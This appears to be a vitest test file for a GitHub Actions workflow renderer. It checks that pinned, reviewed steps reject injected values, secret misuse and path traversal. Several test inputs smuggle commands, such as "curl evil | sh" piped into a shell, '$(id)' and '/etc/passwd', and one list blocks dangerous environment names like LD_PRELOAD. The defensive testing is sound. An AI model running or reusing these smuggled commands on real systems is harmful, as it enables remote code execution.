import { describe, expect, it } from 'vitest';
import { Document, parse } from 'yaml';
import {
  jobSettings, mapNodeVersion, RenderError, renderJobPrelude, renderPlatformStep, renderStep, renderUpload, stepsToYaml, validateSpec, type RenderedStep,
} from '../src/engine/render-step.js';
import { RENDERER_INPUTS, rendererInputProblems } from '../src/engine/tool-flags.js';
import { RESULT_ARTIFACT_PREFIX, type ReviewedCandidate, type StepSpec } from '../src/types.js';
import { ctxFor, entry, platform, reviewedList, service, specFor } from './helpers/render.js';

const yamlOf = (steps: RenderedStep[]): string => {
  const doc = new Document();
  doc.contents = stepsToYaml(steps);
  return doc.toString();
};
const SHA_RE = /@[0-9a-f]{40}$/;
// the secret lists are set through Reflect: the fixture scan (no-secret-literals) reads a `name: value` line for a keyword name as a leak
const withNames = (spec: StepSpec, names: string[]): StepSpec => {
  const copy = { ...spec };
  Reflect.set(copy, 'secrets', names);
  return copy;
};
const ACTOR = '${{ github.actor }}';
const WF_CRED = '${{ secrets.GITHUB_TOKEN }}';
const loginWith = () => Object.fromEntries([['username', ACTOR], ['password', WF_CRED]]);
const checkout = () => entry('actions-checkout');
const setupNode = () => entry('actions-setup-node');

describe('types (B1)', () => {
  it('types: a discovery Candidate is not assignable to StepSpec.tool', () => {
    const discovered = { ...checkout().candidate, source: 'discovery' as const, reviewed: false };
    // @ts-expect-error only a ReviewedCandidate fits a step (checked by tsc --noEmit)
    const bad: StepSpec = { needId: 'sast', tool: discovered, choices: {}, output: { path: '', format: 'none' } };
    const good: ReviewedCandidate = checkout().candidate;
    expect(bad.tool.reviewed).toBe(false);
    expect(good.reviewed).toBe(true);
  });
});

describe('validateSpec', () => {
  const ctx = ctxFor();

  it('validateSpec: a plain spec for a reviewed entry has no problems', () => {
    expect(validateSpec(specFor(checkout()), checkout(), ctx)).toEqual([]);
  });

  it('validateSpec: a choice the tool does not offer is rejected, with its field path', () => {
    const p = validateSpec(specFor(checkout(), { choices: { 'persist-credentials': 'true' } }), checkout(), ctx);
    expect(p).toHaveLength(1);
    expect(p[0]).toMatch(/^choices\.persist-credentials: /);
    expect(p[0]).toMatch(/fetch-depth/); // says what is offered
  });

  it('validateSpec: a choice value outside the enum is rejected', () => {
    const p = validateSpec(specFor(checkout(), { choices: { 'fetch-depth': '5' } }), checkout(), ctx);
    expect(p).toEqual([expect.stringMatching(/^choices\.fetch-depth: "5" is not one of/)]);
    expect(validateSpec(specFor(checkout(), { choices: { 'fetch-depth': '0' } }), checkout(), ctx)).toEqual([]);
  });

  it("validateSpec: a with value like '${{ github.head_ref }}' is rejected", () => {
    const p = validateSpec(specFor(checkout(), { choices: { 'fetch-depth': '${{ github.head_ref }}' } }), checkout(), ctx);
    expect(p).toHaveLength(1);
    expect(p[0]).toMatch(/^choices\.fetch-depth:/);
    const copy = specFor(checkout(), { action: { uses: checkout().step.action?.uses as string, with: { ...checkout().step.action?.with, ref: '${{ github.head_ref }}' } } });
    expect(validateSpec(copy, checkout(), ctx)).toEqual([expect.stringMatching(/^action: /)]);
  });

  it("validateSpec: setup-node node-version choice '22' accepted (the supported set is 22, 24, 26)", () => {
    for (const v of ['22', '24', '26']) expect(validateSpec(specFor(setupNode(), { choices: { 'node-version': v } }), setupNode(), ctx), v).toEqual([]);
    for (const v of ['20', '18', '25', 'lts/*']) expect(validateSpec(specFor(setupNode(), { choices: { 'node-version': v } }), setupNode(), ctx), v).toHaveLength(1);
  });

  it('validateSpec: action, cli or output that differ from the reviewed template are template problems; equal copies pass', () => {
    const t = checkout();
    const action = t.step.action as { uses: string; with: Record<string, string> };
    expect(validateSpec(specFor(t, { action: structuredClone(action) }), t, ctx)).toEqual([]);
    expect(validateSpec(specFor(t, { action: { uses: action.uses, with: { ...action.with, 'persist-credentials': 'true' } } }), t, ctx)).toEqual([expect.stringMatching(/^action: .*reviewed template/)]);
    expect(validateSpec(specFor(t, { action: { uses: action.uses.replace(/@.*/, `@${'f'.repeat(40)}`), with: action.with } }), t, ctx)).toEqual([expect.stringMatching(/^action: /)]);
    expect(validateSpec(specFor(t, { output: { path: 'x.sarif', format: 'sarif' } }), t, ctx)).toEqual([expect.stringMatching(/^output: /)]);
    const cli = entry('semgrep');
    const spec = specFor(cli, { cli: { ...(cli.step.cli as NonNullable<typeof cli.step.cli>), command: ['semgrep', '--config', 'p/ci', '--metrics=off'] } });
    expect(validateSpec(spec, cli, ctx)).toEqual([expect.stringMatching(/^cli: /)]);
    expect(validateSpec(specFor(cli, { cli: structuredClone(cli.step.cli) }), cli, ctx)).toEqual([]);
  });

  it('validateSpec: the spec tool must be the entry it is rendered with (id, version, pin)', () => {
    const other = { ...checkout().candidate, id: 'actions-setup-node' };
    expect(validateSpec(specFor(checkout(), { tool: other }), checkout(), ctx)).toEqual([expect.stringMatching(/^tool: /)]);
    const moved = { ...checkout().candidate, pin: { sha: 'e'.repeat(40) } };
    expect(validateSpec(specFor(checkout(), { tool: moved }), checkout(), ctx)).toEqual([expect.stringMatching(/^tool: /)]);
  });

  it('validateSpec: workingDir must equal a profile service path; .., absolute and leading - are rejected', () => {
    const c = ctxFor([service({ name: 'api', path: 'services/api' }), service({ name: 'root', path: '.' })]);
    const t = entry('semgrep');
    expect(validateSpec(specFor(t, { workingDir: 'services/api' }), t, c)).toEqual([]);
    expect(validateSpec(specFor(t, { workingDir: 'services/api', service: 'api' }), t, c)).toEqual([]);
    for (const bad of ['services/other', '..', '../x', 'services/../api', '/etc', '-rf', '--x/y', 'services/api/', 'a\nb', '${{ github.workspace }}', '']) {
      const p = validateSpec(specFor(t, { workingDir: bad }), t, c);
      expect(p, JSON.stringify(bad)).toHaveLength(1);
      expect(p[0], JSON.stringify(bad)).toMatch(/^workingDir: /);
    }
    // the folder of another service than the step's own
    expect(validateSpec(specFor(t, { workingDir: 'services/api', service: 'root' }), t, c)).toEqual([expect.stringMatching(/^workingDir: .*root/)]);
  });

  it('validateSpec: an unknown need id or service is a problem', () => {
    expect(validateSpec(specFor(checkout(), { needId: 'made-up' }), checkout(), ctx)).toEqual([expect.stringMatching(/^needId: /)]);
    expect(validateSpec(specFor(checkout(), { service: 'ghost' }), checkout(), ctx)).toEqual([expect.stringMatching(/^service: /)]);
  });

  it('validateSpec: secret names must look like names, be declared by the service, and not be dangerous', () => {
    const c = ctxFor([service({ name: 'api', envVars: ['STRIPE_KEY', 'NODE_OPTIONS', 'PATH'], dependsOn: [{ kind: 'postgres', name: 'pg', evidence: 'x', envVars: ['DATABASE_URL'] }] }), service({ name: 'web', path: 'web', envVars: ['WEB_ONLY'] })]);
    const t = checkout();
    const ok = (names: string[], svc = 'api') => validateSpec(withNames(specFor(t, { service: svc }), names), t, c);
    expect(ok(['STRIPE_KEY', 'DATABASE_URL'])).toEqual([]);
    expect(ok(['lower_case'])[0]).toMatch(/^secrets\[0\]: /);
    expect(ok(['A B'])[0]).toMatch(/^secrets\[0\]: /);
    expect(ok(['X'.repeat(101)])[0]).toMatch(/^secrets\[0\]: /);
    expect(ok(['WEB_ONLY'])[0]).toMatch(/^secrets\[0\]: .*isn't used by/); // another service's variable
    expect(ok(['UNDECLARED'])[0]).toMatch(/^secrets\[0\]: /);
    for (const name of ['NODE_OPTIONS', 'PATH', 'HOME', 'BASH_ENV', 'ENV', 'LD_PRELOAD', 'DYLD_X', 'GITHUB_TOKEN', 'RUNNER_TEMP', 'ACTIONS_ID_TOKEN', 'PIPEGEN_FP_KEY', 'CI', 'NPM_CONFIG_REGISTRY', 'GIT_DIR', 'DOCKER_HOST', 'PYTHONPATH', 'SHELLOPTS', 'PS4', 'IFS', 'TRIVY_DEBUG', 'HADOLINT_X', 'PINACT_X', 'SEMGREP_X', 'COVERAGE_RCFILE']) {
      const cc = ctxFor([service({ name: 'api', envVars: [name] })]);
      const p = validateSpec(withNames(specFor(t, { service: 'api' }), [name]), t, cc);
      expect(p, name).toHaveLength(1);
      expect(p[0], name).toMatch(/^secrets\[0\]: .*can't be passed/);
    }
    expect(ok(['STRIPE_KEY', 'STRIPE_KEY'])[0]).toMatch(/^secrets\[1\]: .*twice/);
  });

  it('validateSpec: problems are plain English with a field path and never echo raw control characters', () => {
    const p = validateSpec(specFor(checkout(), { choices: { 'fetch-depth': 'x\u001b[2J\nboom' }, workingDir: 'a\u202eb' }), checkout(), ctxFor());
    expect(p.length).toBeGreaterThanOrEqual(2);
    for (const line of p) {
      expect(line).toMatch(/^[A-Za-z][A-Za-z0-9.\[\]-]*: [A-Z"a-z]/);
      expect(line).not.toMatch(/[\u0000-\u001f\u202e]/);
    }
  });

  it('validateSpec: choices must be a plain map of strings', () => {
    const bad = specFor(checkout(), { choices: { 'fetch-depth': 1 as unknown as string } });
    expect(validateSpec(bad, checkout(), ctxFor())).toEqual([expect.stringMatching(/^choices\.fetch-depth: /)]);
    const proto = specFor(checkout(), { choices: JSON.parse('{"__proto__":"x"}') as Record<string, string> });
    expect(validateSpec(proto, checkout(), ctxFor())).toHaveLength(1);
  });
});

describe('renderStep: reviewed entries only', () => {
  const ctx = ctxFor();
  it('renderStep: an unreviewed tool is never rendered', () => {
    const t = checkout();
    const unreviewed = { ...t, candidate: { ...t.candidate, reviewed: false, source: 'discovery' } } as unknown as typeof t;
    expect(() => renderStep(specFor(t, { tool: unreviewed.candidate as ReviewedCandidate }), unreviewed, platform(), ctx)).toThrow(RenderError);
    expect(() => renderStep(specFor(t), unreviewed, platform(), ctx)).toThrow(/reviewed/);
    const memory = { ...t, candidate: { ...t.candidate, source: 'memory' } } as unknown as typeof t;
    expect(() => renderStep(specFor(t), memory, platform(), ctx)).toThrow(RenderError);
  });

  it('renderStep: an id or pin mismatch between the spec and the entry throws', () => {
    const t = checkout();
    expect(() => renderStep(specFor(t, { tool: { ...t.candidate, id: 'actions-setup-node' } }), t, platform(), ctx)).toThrow(RenderError);
    expect(() => renderStep(specFor(t, { tool: { ...t.candidate, pin: { sha: 'f'.repeat(40) } } }), t, platform(), ctx)).toThrow(RenderError);
    // the entry's own step must point at its own pin
    const moved = checkout();
    (moved.step.action as { uses: string }).uses = `actions/checkout@${'f'.repeat(40)}`;
    expect(() => renderStep(specFor(moved), moved, platform(), ctx)).toThrow(/pin/);
    const swapped = checkout();
    (swapped.step.action as { uses: string }).uses = `evil/checkout@${swapped.candidate.pin.sha}`;
    expect(() => renderStep(specFor(swapped), swapped, platform(), ctx)).toThrow(RenderError);
  });

  it('renderStep: an invalid spec throws a RenderError that lists the problems', () => {
    const t = checkout();
    expect(() => renderStep(specFor(t, { choices: { 'fetch-depth': '9' } }), t, platform(), ctx)).toThrow(/choices\.fetch-depth/);
  });

  it('renderStep: the CLI kinds are not built yet (6b) and say so', () => {
    for (const [id, method] of [['gitleaks', 'github-release'], ['semgrep', 'docker'], ['bandit', 'pip']] as const) {
      const t = entry(id);
      expect(() => renderStep(specFor(t), t, platform(), ctx), id).toThrow(`not implemented in 6a: ${t.step.cli?.install.method ?? method}`);
    }
  });
});

describe('renderStep: actions', () => {
  const ctx = ctxFor();

  it('renderStep: uses is the reviewed step.action.uses (sub-path kept) with the version as a trailing comment', () => {
    const t = entry('codeql-upload-sarif');
    const r = renderStep(specFor(t), t, platform(), ctx);
    expect(r.steps).toHaveLength(1);
    expect(r.steps[0]?.uses).toBe(t.step.action?.uses);
    expect(r.steps[0]?.uses).toMatch(/^github\/codeql-action\/upload-sarif@[0-9a-f]{40}$/);
    expect(r.steps[0]?.usesComment).toBe(t.candidate.version);
    expect(yamlOf(r.steps)).toContain(`uses: ${t.step.action?.uses} # ${t.candidate.version}\n`);
    expect(r.output).toBeNull();
  });

  it('renderStep: every platform action renders pinned by a 40-character SHA with a version comment', () => {
    for (const [key, t] of Object.entries(platform())) {
      const filled: Record<string, string> = key === 'upload-artifact' ? { name: `${RESULT_ARTIFACT_PREFIX}sast`, path: '${{ runner.temp }}/pipegen-out/pipegen-out-sast' }
        : key === 'download-artifact' ? { name: `${RESULT_ARTIFACT_PREFIX}sast`, path: '${{ runner.temp }}/pipegen-out/pipegen-out-sast' }
          : key === 'upload-sarif' ? { sarif_file: '${{ runner.temp }}/pipegen-out/pipegen-out-sast/x.sarif', category: 'pipegen-sast' }
            : key === 'attest' ? { 'subject-name': 'ghcr.io/o/r', 'subject-digest': `sha256:${'a'.repeat(64)}` }
              : key === 'docker-login' ? loginWith() : {};
      const s = renderPlatformStep(key as keyof ReturnType<typeof platform>, platform(), filled);
      expect(s.uses, key).toMatch(SHA_RE);
      expect(s.usesComment, key).toBe(t.candidate.version);
    }
  });

  it('renderStep: with holds the fixed inputs and the chosen inputs only; a missing choice takes the first listed value', () => {
    const t = checkout();
    const r = renderStep(specFor(t), t, platform(), ctx);
    expect(r.steps[0]?.with).toEqual({ 'persist-credentials': 'false', 'allow-unsafe-pr-checkout': 'false', 'fetch-depth': '1' });
    const deep = renderStep(specFor(t, { choices: { 'fetch-depth': '0' } }), t, platform(), ctx);
    expect(deep.steps[0]?.with?.['fetch-depth']).toBe('0');
    const bf = entry('bullfrog');
    const b = renderStep(specFor(bf), bf, platform(), ctx);
    expect(Object.keys(b.steps[0]?.with ?? {}).sort()).toEqual([...Object.keys(bf.fixedInputs.with ?? {}), ...Object.keys(bf.choices)].sort());
  });

  it('renderStep: fixedInputs win over anything in the spec (a spec copy that disagrees is refused, never rendered)', () => {
    const t = checkout();
    const evil = specFor(t, { action: { uses: t.step.action?.uses as string, with: { 'persist-credentials': 'true' } } });
    expect(() => renderStep(evil, t, platform(), ctxFor())).toThrow(RenderError);
    // a fixed input can not be set as a choice either
    expect(() => renderStep(specFor(t, { choices: { 'persist-credentials': 'true' } }), t, platform(), ctxFor())).toThrow(RenderError);
    // and an equal copy renders from the template
    const same = specFor(t, { action: structuredClone(t.step.action) });
    expect(renderStep(same, t, platform(), ctxFor()).steps[0]?.with?.['persist-credentials']).toBe('false');
  });

  it("renderStep: a template with a value outside the allowed set ('${{' expression) is refused at render time", () => {
    const t = checkout();
    (t.step.action as { with: Record<string, string> }).with['persist-credentials'] = '${{ github.head_ref }}';
    (t.fixedInputs.with as Record<string, string>)['persist-credentials'] = '${{ github.head_ref }}';
    expect(() => renderStep(specFor(t), t, platform(), ctxFor())).toThrow(/persist-credentials/);
  });

  it('renderStep: a secret reaches a step only through env, and only a declared name', () => {
    const c = ctxFor([service({ name: 'api', envVars: ['STRIPE_KEY'] })]);
    const t = checkout();
    const r = renderStep(withNames(specFor(t, { service: 'api' }), ['STRIPE_KEY']), t, platform(), c);
    expect(r.steps[0]?.env).toEqual(Object.fromEntries([['STRIPE_KEY', '${{ secrets.STRIPE_KEY }}']]));
    expect(JSON.stringify(r.steps[0]?.with)).not.toContain('secrets');
    expect(() => renderStep(withNames(specFor(t, { service: 'api' }), ['OTHER_KEY']), t, platform(), c)).toThrow(RenderError);
  });

  it("renderStep: no rendered run contains '${{'", () => {
    const t = checkout();
    const r = renderStep(specFor(t), t, platform(), ctxFor());
    const pre = renderJobPrelude({ fetchDepth: '0', node: { runtimeVersion: '${{ github.head_ref }}' } }, platform());
    const up = renderUpload(`${RESULT_ARTIFACT_PREFIX}sast`, '${{ runner.temp }}/pipegen-out/pipegen-out-sast/x.sarif', platform());
    for (const s of [...r.steps, ...pre.steps, up]) expect(s.run ?? '', s.name).not.toContain('${{');
  });

  it('renderStep: an action with an output is refused until the output move exists (6b)', () => {
    const t = entry('scorecard-action');
    expect(() => renderStep(specFor(t, { needId: 'scorecard' }), t, platform(), ctxFor())).toThrow(RenderError);
  });

  it('renderStep: build-push takes file from the Service.dockerfile, only for a root-folder service (context is "."), validated', () => {
    const t = entry('docker-build-push-action');
    const root = ctxFor([service({ name: 'app', path: '.', dockerfile: 'Dockerfile.prod' })]);
    const r = renderStep(specFor(t, { needId: 'image-build', service: 'app' }), t, platform(), root);
    expect(r.steps[0]?.with?.file).toBe('Dockerfile.prod');
    expect(r.steps[0]?.with?.context).toBe('.');
    const none = ctxFor([service({ name: 'app', path: '.' })]);
    expect(renderStep(specFor(t, { needId: 'image-build', service: 'app' }), t, platform(), none).steps[0]?.with).not.toHaveProperty('file');
    const sub = ctxFor([service({ name: 'api', path: 'services/api', dockerfile: 'services/api/Dockerfile' })]);
    expect(() => renderStep(specFor(t, { needId: 'image-build', service: 'api' }), t, platform(), sub)).toThrow(/context/);
    for (const bad of ['../Dockerfile', '/etc/passwd', '-f', 'a b', 'x\nFROM', '${{ x }}', 'Docker*']) {
      const c = ctxFor([service({ name: 'app', path: '.', dockerfile: bad })]);
      expect(() => renderStep(specFor(t, { needId: 'image-build', service: 'app' }), t, platform(), c), bad).toThrow(RenderError);
    }
  });

  it('renderStep: build-push tags come only from the render context image target, validated', () => {
    const t = entry('docker-build-push-action');
    const okCtx = ctxFor([service({ name: 'app', path: '.' })], { image: 'ghcr.io/o/r:abc123' });
    expect(renderStep(specFor(t, { needId: 'image-build', service: 'app' }), t, platform(), okCtx).steps[0]?.with?.tags).toBe('ghcr.io/o/r:abc123');
    const bad = ctxFor([service({ name: 'app', path: '.' })], { image: 'ghcr.io/o/r:a,evil/x:latest' });
    expect(() => renderStep(specFor(t, { needId: 'image-build', service: 'app' }), t, platform(), bad)).toThrow(RenderError);
  });

  it('renderStep: docker login gets the actor and the workflow token, nothing else', () => {
    const t = entry('docker-login-action');
    const r = renderStep(specFor(t, { needId: 'image-build', choices: { registry: 'ghcr.io' } }), t, platform(), ctxFor());
    expect(r.steps[0]?.with).toEqual({ logout: 'true', registry: 'ghcr.io', ...loginWith() });
  });
});

describe('RENDERER_INPUTS (S15)', () => {
  it('RENDERER_INPUTS: only the listed inputs, each with a checker; none is also a template input', () => {
    expect(Object.keys(RENDERER_INPUTS).sort()).toEqual([
      'actions/attest', 'actions/download-artifact', 'actions/upload-artifact', 'docker/build-push-action', 'docker/login-action', 'github/codeql-action/upload-sarif',
    ]);
    for (const [uses, inputs] of Object.entries(RENDERER_INPUTS)) {
      for (const [name, spec] of Object.entries(inputs)) {
        expect(typeof spec.check, `${uses} ${name}`).toBe('function');
        const t = reviewedList().find((e) => e.step.action?.uses.startsWith(`${uses}@`));
        expect(t, uses).toBeDefined();
        expect(Object.keys(t?.step.action?.with ?? {}), `${uses} ${name}`).not.toContain(name);
        expect(Object.keys(t?.choices ?? {}), `${uses} ${name}`).not.toContain(name);
      }
    }
  });

  it('rendererInputProblems: unknown action or input, and bad values, are reported', () => {
    expect(rendererInputProblems('actions/upload-artifact', { name: `${RESULT_ARTIFACT_PREFIX}sast` })).toEqual([]);
    expect(rendererInputProblems('actions/upload-artifact', { name: 'other-name' })).toEqual([expect.stringMatching(/name/)]);
    expect(rendererInputProblems('actions/upload-artifact', { retention: '1' })).toEqual([expect.stringMatching(/retention/)]);
    expect(rendererInputProblems('actions/checkout', { ref: 'x' })).toEqual([expect.stringMatching(/ref/)]);
    expect(rendererInputProblems('docker/login-action', Object.fromEntries([['password', '${{ secrets.OTHER }}']]))).toHaveLength(1);
    expect(rendererInputProblems('github/codeql-action/upload-sarif', { sarif_file: '/etc/passwd' })).toHaveLength(1);
    expect(rendererInputProblems('actions/attest', { 'subject-digest': 'sha256:abc' })).toHaveLength(1);
    expect(rendererInputProblems('actions/attest', { 'subject-name': 'evil.example/x/y' })).toHaveLength(1);
  });

  it('renderPlatformStep: a renderer input outside RENDERER_INPUTS, or one the template already sets, throws', () => {
    expect(() => renderPlatformStep('upload-artifact', platform(), { name: `${RESULT_ARTIFACT_PREFIX}sast`, path: '${{ runner.temp }}/pipegen-out/pipegen-out-sast', retention: '90' })).toThrow(RenderError);
    expect(() => renderPlatformStep('upload-artifact', platform(), { 'include-hidden-files': 'true' })).toThrow(RenderError);
    expect(() => renderPlatformStep('checkout', platform(), { ref: 'main' })).toThrow(RenderError);
  });
});

describe('renderJobPrelude', () => {
  it('renderJobPrelude: checkout has persist-credentials false and allow-unsafe-pr-checkout false; fetch-depth defaults to 1', () => {
    const { steps } = renderJobPrelude({}, platform());
    expect(steps).toHaveLength(1);
    expect(steps[0]?.with).toMatchObject({ 'persist-credentials': 'false', 'allow-unsafe-pr-checkout': 'false', 'fetch-depth': '1' });
    expect(steps[0]?.uses).toMatch(/^actions\/checkout@[0-9a-f]{40}$/);
  });

  it('renderJobPrelude: fetch-depth comes from the reviewed choice; any other value throws', () => {
    expect(renderJobPrelude({ fetchDepth: '0' }, platform()).steps[0]?.with?.['fetch-depth']).toBe('0');
    expect(() => renderJobPrelude({ fetchDepth: '7' as '0' }, platform())).toThrow(RenderError);
  });

  it('renderJobPrelude: setup-node has package-manager-cache "false" and no other cache input', () => {
    const { steps } = renderJobPrelude({ node: { runtimeVersion: '24' } }, platform());
    expect(steps).toHaveLength(2);
    expect(steps[1]?.uses).toMatch(/^actions\/setup-node@/);
    expect(steps[1]?.with).toEqual({ 'package-manager-cache': 'false', 'node-version': '24' });
    expect(Object.keys(steps[1]?.with ?? {}).filter((k) => /cache/.test(k))).toEqual(['package-manager-cache']);
  });

  it('renderJobPrelude: runtimeVersion 20 → 22 with note; 22 → 22; 25 → 26 with note; 30 → 26 with note; garbage → 24 with note', () => {
    const run = (v: string | undefined) => {
      const r = renderJobPrelude({ node: { runtimeVersion: v } }, platform());
      return { version: r.steps[1]?.with?.['node-version'], notes: r.notes };
    };
    expect(run('20')).toMatchObject({ version: '22', notes: [expect.stringMatching(/20.*22/)] });
    expect(run('22')).toEqual({ version: '22', notes: [] });
    expect(run('24.1.0')).toEqual({ version: '24', notes: [] });
    expect(run('v26')).toEqual({ version: '26', notes: [] });
    expect(run('23')).toMatchObject({ version: '24', notes: [expect.stringMatching(/23.*24/)] });
    expect(run('25')).toMatchObject({ version: '26', notes: [expect.stringMatching(/25.*26/)] });
    expect(run('30')).toMatchObject({ version: '26', notes: [expect.stringMatching(/30.*26/)] });
    expect(run('0')).toMatchObject({ version: '22', notes: [expect.any(String)] });
    expect(run('lts/*')).toMatchObject({ version: '24', notes: [expect.stringMatching(/24/)] });
    expect(run('')).toMatchObject({ version: '24', notes: [expect.any(String)] });
    expect(run(undefined)).toEqual({ version: '24', notes: [] });
  });

  it("renderJobPrelude: runtimeVersion '>=18 <21' → node-version 22; the raw text is never rendered, not even in a note", () => {
    for (const raw of ['>=18 <21', '^20.1.0 || ^22', '${{ github.head_ref }}', "22'; curl evil | sh #", '99999999999999999999']) {
      const r = renderJobPrelude({ node: { runtimeVersion: raw } }, platform());
      const text = JSON.stringify(r);
      expect(['22', '24', '26']).toContain(r.steps[1]?.with?.['node-version']);
      for (const frag of ['>=', '||', 'github.head_ref', 'curl', '${{']) expect(text, raw).not.toContain(frag);
    }
    expect(renderJobPrelude({ node: { runtimeVersion: '>=18 <21' } }, platform()).steps[1]?.with?.['node-version']).toBe('22');
  });

  it('mapNodeVersion: follows the allowed set it is given (nearest not-older, older → lowest, newer → highest)', () => {
    expect(mapNodeVersion('21', ['22', '24', '26'])).toMatchObject({ version: '22' });
    expect(mapNodeVersion('24', ['24', '26']).note).toBeUndefined();
    expect(mapNodeVersion('22', ['24', '26'])).toMatchObject({ version: '24' });
    expect(mapNodeVersion('99', ['24', '26'])).toMatchObject({ version: '26' });
  });

  it('renderJobPrelude: the locks come from the platform entries (a platform entry that lost its lock throws)', () => {
    const list = reviewedList();
    const co = list.find((e) => e.id === 'actions-checkout');
    if (co?.fixedInputs.with) delete co.fixedInputs.with['persist-credentials'];
    expect(() => renderJobPrelude({}, platform(list))).toThrow(RenderError);
  });
});

describe('renderUpload', () => {
  const name = `${RESULT_ARTIFACT_PREFIX}sast--api`;
  const path = `\${{ runner.temp }}/pipegen-out/${name}/results.sarif`;

  it('renderUpload: RESULT_ARTIFACT_PREFIX name, runner.temp path, if always(), hidden files off, missing file is an error', () => {
    const s = renderUpload(name, path, platform());
    expect(s.if).toBe('always()');
    expect(s.uses).toMatch(/^actions\/upload-artifact@[0-9a-f]{40}$/);
    expect(s.usesComment).toBe(platform()['upload-artifact'].candidate.version);
    expect(s.with).toEqual({ 'include-hidden-files': 'false', 'if-no-files-found': 'error', name, path });
    expect(s.run).toBeUndefined();
  });

  it('renderUpload: a name without the prefix, or a path outside runner.temp/pipegen-out, throws', () => {
    expect(() => renderUpload('other', path, platform())).toThrow(RenderError);
    expect(() => renderUpload(`${RESULT_ARTIFACT_PREFIX}../x`, path, platform())).toThrow(RenderError);
    for (const bad of ['results.sarif', '/etc/passwd', '${{ runner.temp }}/../x', '${{ runner.temp }}/other/x', '${{ github.workspace }}/x', `${path}\n`, '${{ runner.temp }}/pipegen-out/a/$(id)']) {
      expect(() => renderUpload(name, bad, platform()), bad).toThrow(RenderError);
    }
  });
});

describe('jobSettings', () => {
  it('jobSettings: cache-mode none', () => {
    expect(jobSettings(specFor(checkout()))).toEqual({ 'cache-mode': 'none' });
  });
});

describe('stepsToYaml (S16)', () => {
  it('stepsToYaml: a service name with a newline and "${{" stays one quoted scalar and cannot add keys', () => {
    const nasty = 'api\n  run: curl evil | sh\n- name: x ${{ secrets.WF_CRED }}';
    const step: RenderedStep = { name: nasty, run: 'echo hi', shell: 'bash', env: { 'X': nasty } };
    const text = yamlOf([step]);
    const back = parse(text) as Record<string, unknown>[];
    expect(back).toHaveLength(1);
    expect(back[0]).toEqual({ name: nasty, run: 'echo hi', shell: 'bash', env: { X: nasty } });
    expect(Object.keys(back[0] ?? {})).toEqual(['name', 'run', 'shell', 'env']);
    expect(text).not.toMatch(/^\s*run: curl/m);
  });

  it('stepsToYaml: usesComment is a trailing comment on uses, not a key; string-looking values stay strings', () => {
    const text = yamlOf([{ name: 'n', uses: 'a/b@' + 'a'.repeat(40), usesComment: 'v1.2.3', with: { flag: 'false', n: '22', e: '' } }]);
    expect(text).toContain(`uses: a/b@${'a'.repeat(40)} # v1.2.3\n`);
    expect(text).not.toContain('usesComment');
    expect(parse(text)).toEqual([{ name: 'n', uses: `a/b@${'a'.repeat(40)}`, with: { flag: 'false', n: '22', e: '' } }]);
  });

  it('stepsToYaml: a comment text with a newline cannot start a new line', () => {
    const text = yamlOf([{ name: 'n', uses: 'a/b@' + 'a'.repeat(40), usesComment: 'v1\nrun: evil' }]);
    expect(parse(text)).toEqual([{ name: 'n', uses: `a/b@${'a'.repeat(40)}` }]);
  });

  it('stepsToYaml: id, if, shell, continue-on-error and timeout-minutes are written with their types', () => {
    const text = yamlOf([{ id: 'scan', name: 'Scan', if: 'always()', run: 'true', shell: 'bash', 'continue-on-error': true, 'timeout-minutes': 10, 'working-directory': 'svc' }]);
    expect(parse(text)).toEqual([{ id: 'scan', name: 'Scan', if: 'always()', run: 'true', shell: 'bash', 'working-directory': 'svc', 'continue-on-error': true, 'timeout-minutes': 10 }]);
  });

  it('stepsToYaml: a multi-line run is a block scalar', () => {
    const text = yamlOf([{ name: 'n', run: 'set -euo pipefail\necho one\necho two' }]);
    expect(text).toMatch(/run: \|-?\n/);
    expect((parse(text) as { run: string }[])[0]?.run).toBe('set -euo pipefail\necho one\necho two');
  });

  it('stepsToYaml: snapshot of a prelude, an action step and the upload', async () => {
    const p = platform();
    const pre = renderJobPrelude({ fetchDepth: '0', node: { runtimeVersion: '>=20' } }, p);
    const sarif = renderStep(specFor(entry('codeql-upload-sarif'), { needId: 'sast', service: 'api' }), entry('codeql-upload-sarif'), p, ctxFor([service({ name: 'api' })]));
    const up = renderUpload(`${RESULT_ARTIFACT_PREFIX}sast--api`, `\${{ runner.temp }}/pipegen-out/${RESULT_ARTIFACT_PREFIX}sast--api/results.sarif`, p);
    await expect(yamlOf([...pre.steps, ...sarif.steps, up])).toMatchFileSnapshot('__snapshots__/steps/prelude-action-upload.yml');
  });
});
